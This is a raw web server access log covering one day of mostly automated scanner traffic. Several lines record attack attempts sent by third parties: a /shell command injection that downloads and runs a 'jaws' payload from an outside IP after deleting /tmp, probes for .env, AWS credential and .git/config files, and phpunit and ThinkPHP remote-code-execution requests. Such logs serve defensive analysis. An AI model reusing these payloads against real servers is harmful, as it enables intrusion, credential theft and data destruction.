139.144.52.241 - - [06/Feb/2023:01:52:12 -0600] "GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1" 301 282 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:13 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:13 -0600] "GET /__Additional HTTP/1.1" 301 253 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:13 -0600] "GET /menu.jhtml HTTP/1.1" 301 251 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:13 -0600] "GET /localstart.asp HTTP/1.1" 301 255 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:13 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:13 -0600] "GET /home.cfm HTTP/1.1" 301 249 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:13 -0600] "GET /index.aspx HTTP/1.1" 301 251 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:14 -0600] "GET /readme.txt HTTP/1.1" 301 251 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:14 -0600] "GET /admin.aspx HTTP/1.1" 301 251 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:14 -0600] "GET /default.pl HTTP/1.1" 301 251 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:14 -0600] "GET /localstart.jsp HTTP/1.1" 301 255 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:14 -0600] "GET /admin.shtml HTTP/1.1" 301 252 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:15 -0600] "GET /admin.pl HTTP/1.1" 301 249 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:15 -0600] "GET /menu.php HTTP/1.1" 301 249 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:15 -0600] "GET /index.php HTTP/1.1" 301 250 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:15 -0600] "GET /main.shtml HTTP/1.1" 301 251 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:15 -0600] "GET /home.php HTTP/1.1" 301 249 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:16 -0600] "GET /admin.php HTTP/1.1" 301 250 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:16 -0600] "GET /admin.jsp HTTP/1.1" 301 250 "-" "curl/7.54.0"
183.136.225.32 - - [06/Feb/2023:01:52:16 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
139.144.52.241 - - [06/Feb/2023:01:52:16 -0600] "GET /localstart.pl HTTP/1.1" 301 254 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:16 -0600] "GET /localstart.aspx HTTP/1.1" 301 256 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:16 -0600] "GET /admin.jsa HTTP/1.1" 301 250 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:17 -0600] "GET /indice.html HTTP/1.1" 301 252 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:17 -0600] "GET /admin.jhtml HTTP/1.1" 301 252 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:17 -0600] "GET /default.shtml HTTP/1.1" 301 254 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:17 -0600] "GET /home.html HTTP/1.1" 301 250 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:17 -0600] "GET /admin.cfm HTTP/1.1" 301 250 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:18 -0600] "GET /home.pl HTTP/1.1" 301 248 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:18 -0600] "GET /default.cgi HTTP/1.1" 301 252 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:18 -0600] "GET /base.php HTTP/1.1" 301 249 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:18 -0600] "GET /main.html HTTP/1.1" 301 250 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:18 -0600] "GET /start.jsp HTTP/1.1" 301 250 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:19 -0600] "GET /base.shtml HTTP/1.1" 301 251 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:19 -0600] "GET /main.cfm HTTP/1.1" 301 249 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:19 -0600] "GET /base.pl HTTP/1.1" 301 248 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:19 -0600] "GET /localstart.jhtml HTTP/1.1" 301 257 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:20 -0600] "GET /menu.pl HTTP/1.1" 301 248 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:20 -0600] "GET /start.cfm HTTP/1.1" 301 250 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:20 -0600] "GET /indice.jsp HTTP/1.1" 301 251 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:20 -0600] "GET /main.pl HTTP/1.1" 301 248 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:21 -0600] "GET /admin.asp HTTP/1.1" 301 250 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:21 -0600] "GET /main.jsp HTTP/1.1" 301 249 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:21 -0600] "GET /menu.asp HTTP/1.1" 301 249 "-" "curl/7.54.0"
139.144.52.241 - - [06/Feb/2023:01:52:21 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
139.144.52.241 - - [06/Feb/2023:01:52:22 -0600] "GET / HTTP/1.0" 301 241 "-" "-"
139.144.52.241 - - [06/Feb/2023:01:52:22 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
183.136.225.32 - - [06/Feb/2023:01:52:36 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
143.110.222.166 - - [06/Feb/2023:02:05:38 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [06/Feb/2023:02:31:34 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.246.220.98 - - [06/Feb/2023:02:35:58 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.216.146 - - [06/Feb/2023:02:43:06 -0600] "\x16\x03\x01" 400 226 "-" "-"
143.110.216.146 - - [06/Feb/2023:02:43:06 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.222.166 - - [06/Feb/2023:03:08:39 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
27.129.129.231 - - [06/Feb/2023:03:10:17 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 301 301 "-" "Hello, world"
60.221.61.247 - - [06/Feb/2023:03:10:19 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 301 301 "-" "Hello, world"
60.221.238.187 - - [06/Feb/2023:03:10:22 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 301 301 "-" "Hello, world"
60.221.46.48 - - [06/Feb/2023:03:10:27 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 301 301 "-" "Hello, world"
194.165.16.71 - - [06/Feb/2023:03:25:10 -0600] "\x03" 400 226 "-" "-"
194.165.16.71 - - [06/Feb/2023:03:25:11 -0600] "\x03" 400 226 "-" "-"
143.110.222.166 - - [06/Feb/2023:04:05:49 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
157.230.30.107 - - [06/Feb/2023:04:18:35 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
87.236.176.178 - - [06/Feb/2023:04:34:32 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
60.217.75.70 - - [06/Feb/2023:04:41:29 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0"
109.237.97.180 - - [06/Feb/2023:05:15:05 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [06/Feb/2023:05:15:06 -0600] "\x16\x03\x01\x01H\x01" 400 226 "-" "-"
109.237.97.180 - - [06/Feb/2023:05:15:07 -0600] "POST /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [06/Feb/2023:05:15:07 -0600] "GET /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [06/Feb/2023:05:15:07 -0600] "POST /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [06/Feb/2023:05:15:08 -0600] "GET /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
14.102.47.245 - - [06/Feb/2023:05:37:05 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
81.209.147.4 - - [06/Feb/2023:05:43:27 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
81.209.147.4 - - [06/Feb/2023:05:43:32 -0600] "\n" 400 226 "-" "-"
81.209.147.4 - - [06/Feb/2023:05:43:37 -0600] "GET / HTTP/1.0" 301 241 "-" "-"
143.110.222.166 - - [06/Feb/2023:05:45:37 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [06/Feb/2023:05:47:53 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
51.159.152.255 - - [06/Feb/2023:06:18:23 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
51.159.152.255 - - [06/Feb/2023:06:18:24 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
164.215.237.45 - - [06/Feb/2023:06:27:30 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.110.222.166 - - [06/Feb/2023:06:39:34 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
194.87.151.116 - - [06/Feb/2023:06:43:47 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
71.252.197.38 - - [06/Feb/2023:06:52:14 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
152.89.196.211 - - [06/Feb/2023:07:04:46 -0600] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 291 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
60.217.75.70 - - [06/Feb/2023:07:11:59 -0600] "\x16\x03\x01" 400 226 "-" "-"
152.89.196.211 - - [06/Feb/2023:07:14:31 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 291 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [06/Feb/2023:07:21:37 -0600] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [06/Feb/2023:07:27:25 -0600] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 365 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [06/Feb/2023:07:38:19 -0600] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 309 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [06/Feb/2023:08:06:22 -0600] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [06/Feb/2023:08:16:00 -0600] "GET /console/ HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [06/Feb/2023:08:28:23 -0600] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.198.40.245 - - [06/Feb/2023:08:29:27 -0600] "\x16\x03\x01" 400 226 "-" "-"
143.198.40.245 - - [06/Feb/2023:08:29:27 -0600] "\x16\x03\x01" 400 226 "-" "-"
143.198.40.245 - - [06/Feb/2023:08:29:28 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
152.89.196.211 - - [06/Feb/2023:08:30:07 -0600] "GET /_ignition/execute-solution HTTP/1.1" 301 267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [06/Feb/2023:08:30:12 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [06/Feb/2023:08:30:43 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.9.150.3 - - [06/Feb/2023:08:37:06 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
64.62.197.63 - - [06/Feb/2023:08:48:15 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
64.62.197.71 - - [06/Feb/2023:08:48:42 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53"
64.62.197.67 - - [06/Feb/2023:08:49:57 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.117"
192.155.90.220 - - [06/Feb/2023:08:59:13 -0600] "\x16\x03\x01" 400 226 "-" "-"
179.43.177.242 - - [06/Feb/2023:08:59:47 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
152.89.196.211 - - [06/Feb/2023:09:04:01 -0600] "GET /actuator/gateway/routes HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.223.227.140 - - [06/Feb/2023:09:10:44 -0600] "HEAD /.env HTTP/1.1" 301 - "-" "-"
167.94.138.117 - - [06/Feb/2023:09:31:42 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
167.94.138.117 - - [06/Feb/2023:09:31:42 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.117 - - [06/Feb/2023:09:31:43 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
143.110.222.166 - - [06/Feb/2023:09:32:09 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
95.128.189.25 - - [06/Feb/2023:09:56:57 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.246.220.98 - - [06/Feb/2023:10:08:00 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
79.137.207.22 - - [06/Feb/2023:10:14:50 -0600] "CONNECT google.com:443 HTTP/1.1" 301 241 "-" "Go-http-client/1.1"
143.110.222.166 - - [06/Feb/2023:10:26:52 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
73.119.152.37 - - [06/Feb/2023:10:40:17 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
173.249.56.171 - - [06/Feb/2023:10:53:27 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36"
45.9.110.186 - - [06/Feb/2023:11:06:48 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
45.9.110.186 - - [06/Feb/2023:11:06:49 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
45.9.110.186 - - [06/Feb/2023:11:06:51 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
45.9.110.186 - - [06/Feb/2023:11:06:51 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
193.32.162.159 - - [06/Feb/2023:11:10:36 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [06/Feb/2023:11:31:17 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
51.77.247.119 - - [06/Feb/2023:11:43:19 -0600] "POST /dev/.env HTTP/1.1" 301 249 "-" "curl/7.64.0"
128.1.131.197 - - [06/Feb/2023:12:06:03 -0600] "GET / HTTP/1.1" 301 241 "-" "-"
185.224.128.219 - - [06/Feb/2023:12:07:23 -0600] "GET /admin/config.php HTTP/1.1" 301 257 "-" "python-requests/2.22.0"
185.246.220.98 - - [06/Feb/2023:12:22:37 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
143.110.222.166 - - [06/Feb/2023:12:27:23 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
169.57.196.28 - - [06/Feb/2023:12:34:21 -0600] "CONNECT www.google.com:443 HTTP/1.1" 301 241 "-" "Go-http-client/1.1"
45.227.254.19 - - [06/Feb/2023:12:45:56 -0600] "\x03" 400 226 "-" "-"
20.246.106.254 - - [06/Feb/2023:13:20:05 -0600] "GET /dist/ HTTP/1.1" 301 246 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
143.110.222.166 - - [06/Feb/2023:13:31:00 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
173.249.56.171 - - [06/Feb/2023:13:49:12 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36"
45.11.57.48 - - [06/Feb/2023:14:02:49 -0600] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1" 301 277 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
45.11.57.48 - - [06/Feb/2023:14:02:58 -0600] "POST /index.htm HTTP/1.1" 301 250 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
178.128.247.220 - - [06/Feb/2023:14:09:36 -0600] "\x16\x03\x01" 400 226 "-" "-"
178.128.247.220 - - [06/Feb/2023:14:09:36 -0600] "\x16\x03\x01" 400 226 "-" "-"
178.128.247.220 - - [06/Feb/2023:14:09:36 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
5.161.189.7 - - [06/Feb/2023:14:13:18 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763"
157.230.30.107 - - [06/Feb/2023:14:19:52 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
193.32.162.163 - - [06/Feb/2023:14:27:24 -0600] "GET /.git/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
143.110.222.166 - - [06/Feb/2023:14:44:46 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [06/Feb/2023:14:56:19 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 264 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
109.107.166.87 - - [06/Feb/2023:15:13:31 -0600] "\x03" 400 226 "-" "-"
159.203.208.13 - - [06/Feb/2023:15:17:25 -0600] "MGLNDD_194.195.210.97_80\n" 400 226 "-" "-"
143.110.222.166 - - [06/Feb/2023:15:49:42 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
66.249.70.106 - - [06/Feb/2023:16:13:50 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.108 - - [06/Feb/2023:16:13:51 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.84.142.247 - - [06/Feb/2023:16:32:47 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
179.43.177.242 - - [06/Feb/2023:16:42:14 -0600] "GET / HTTP/1.1" 301 241 "-" "Hello World"
143.110.222.166 - - [06/Feb/2023:16:49:54 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
46.166.171.186 - - [06/Feb/2023:17:07:56 -0600] "GET /wp-login.php HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
143.110.222.166 - - [06/Feb/2023:17:24:26 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [06/Feb/2023:17:35:43 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.47 - - [06/Feb/2023:18:11:22 -0600] "GET / HTTP/1.1" 301 241 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
